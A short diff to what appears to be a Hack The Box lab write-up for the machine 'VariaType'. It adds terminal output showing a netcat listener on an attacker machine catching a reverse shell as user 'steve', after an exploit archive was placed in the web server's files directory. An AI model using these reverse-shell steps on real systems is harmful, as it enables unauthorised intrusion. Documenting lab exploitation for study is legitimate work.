@@ -1929,6 +1929,16 @@ Saving to: ‘/var/www/portal.variatype.htb/public/files/exploit.zip’
 
 www-data@variatype:~/portal.variatype.htb/public/files$ 
 ```
+
+```shell
+┌──(kali㉿kali)-[~/PUEMAN/HTB/SN10/VariaType]
+└─$ nc -lvnp 4445                
+listening on [any] 4445 ...
+connect to [10.10.14.71] from (UNKNOWN) [10.129.15.219] 35946
+bash: cannot set terminal process group (5724): Inappropriate ioctl for device
+bash: no job control in this shell
+steve@variatype:/tmp/ffarchive-5725-1$ 
+```
 <div align="center">
 <br>
 <br>
